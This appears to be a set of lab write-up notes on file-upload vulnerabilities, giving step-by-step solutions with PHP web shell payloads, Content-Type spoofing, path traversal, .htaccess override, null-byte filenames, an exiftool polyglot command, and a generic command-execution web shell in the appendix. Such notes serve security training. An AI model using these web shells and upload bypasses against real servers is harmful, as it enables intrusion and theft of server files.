__________________________________________________________________________________________


Remote code execution via web shell upload:

WEAKNESS:
No validations on files uploaded.

SOLUTION:
When browsing account page, notice a GET request is sent to /files/avatars/<YOUR-IMAGE>
Upload a php file on avatar changing feature with <?php echo file_get_contents('/home/carlos/secret'); ?>
Send GET /files/avatars/exploit.php request, secret will be shown in response.

__________________________________________________________________________________________


Web shell upload via Content-Type restriction bypass:

WEAKNESS:
Server block unexpected file types, but only rely on checking Content-Type header, a user-controllable input.

SOLUTION:
Upload a php file on avatar changing feature with <?php echo file_get_contents('/home/carlos/secret'); ?>
Receive error indicating only image jpeg/jpg/png acceptable.
Change Content-Type header's value to image/jpeg, resend the POST request.
Send GET /files/avatars/exploit.php request, secret will be shown in response.

__________________________________________________________________________________________


Web shell upload via path traversal:

WEAKNESS:
Basic filename sanitization is enforced. Safe file handling also, but only current directory, parent directory's not.

SOLUTION:
Upload a php file on avatar changing feature with <?php echo file_get_contents('/home/carlos/secret'); ?>
Send GET /files/avatars/exploit.php request, php script not executed but plain text.
Replace the Content-Disposition header's filename value to ../exploit.php, then send, notice ../ is removed in the response.
Replace ../ to %2e%2e%2f, which is URL encoding to obfuscate the ../ removal.
Send GET /files/exploit.php request, secret will be shown in response.

__________________________________________________________________________________________


Web shell upload via extension blacklist bypass:

WEAKNESS:
Server block unexpected file types through .htaccess, but .htaccess can be modified.

SOLUTION:
Upload a php file on avatar changing feature with <?php echo file_get_contents('/home/carlos/secret'); ?>
The response indicates that you are not allowed to upload files with a .php extension. 
Notice that the headers reveal that you're talking to an Apache server.
Modify the POST /my-account/avatar request as below.
Change the value of the filename parameter to .htaccess.
Change the value of the Content-Type header to text/plain.
Replace the contents of your PHP file with "AddType application/x-httpd-php .l33t".
After sending, the server will treat .133t file as php file, and execute them accordingly.
Send your php file again but with .133t extension instead of php extension.
Send GET /files/avatars/exploit.133t request, secret will be shown in response.

__________________________________________________________________________________________


Web shell upload via obfuscated file extension:

WEAKNESS:
Server block unexpected file extensions, but skippable through null byte injection.

SOLUTION:
Upload a php file on avatar changing feature with <?php echo file_get_contents('/home/carlos/secret'); ?>
Receive error indicating only image jpeg/jpg/png acceptable.
Replace the Content-Disposition header's filename value to exploit.php%00.jpg, then send, notice .jpg is removed in the repsonse.
Send GET /files/avatars/exploit.php request, secret will be shown in response.

__________________________________________________________________________________________


Remote code execution via polyglot web shell upload:

WEAKNESS:
Server block unexpected MIME type, not file extension, skippable through polyglot web shell upload.

SOLUTION:
Upload a php file on avatar changing feature with <?php echo file_get_contents('/home/carlos/secret'); ?>
Receive error indicating only image jpeg/jpg/png acceptable.
Find a random image and run the command below.
exiftool -Comment="<?php echo 'SECRET ' . file_get_contents('/home/carlos/secret') . ' SHOWN'; ?>" <YOUR-RANDOM-IMAGE>.jpg -o polyglot.php
This adds your PHP payload to the image's Comment field, then saves the image with a .php extension.
Send GET /files/avatars/polyglot.php request, secret will be shown in response.

__________________________________________________________________________________________


Appendix:

<?php echo file_get_contents('/home/carlos/secret'); ?> can also be replace with
<?php system($_GET['cmd']); ?>, but need to append ?cmd=cat+/home/carlos/secret in the path.

.htaccess: A configuration file used by Apache web servers to control directory-level settings. It allows developers and administrators to override global server configurations for specific folders — without modifying the main server config ().
Placed in a directory (e.g., /public_html), it can:
• 	Control access permissions
• 	Redirect URLs
• 	Rewrite URLs (mod_rewrite)
• 	Set MIME types
• 	Enable or disable features like directory listing
• 	Define custom error pages


polyglot: a file that conforms to the syntax of more than one file type.
- Create files that work across different systems or interpreters.
- Demonstrate cleverness in language design or file structure.
- Embed multiple formats in one file for convenience.
- Example:  a PDF that also contains embedded XML or metadata readable by other tools.
            a file that is valid HTML and also valid JavaScript.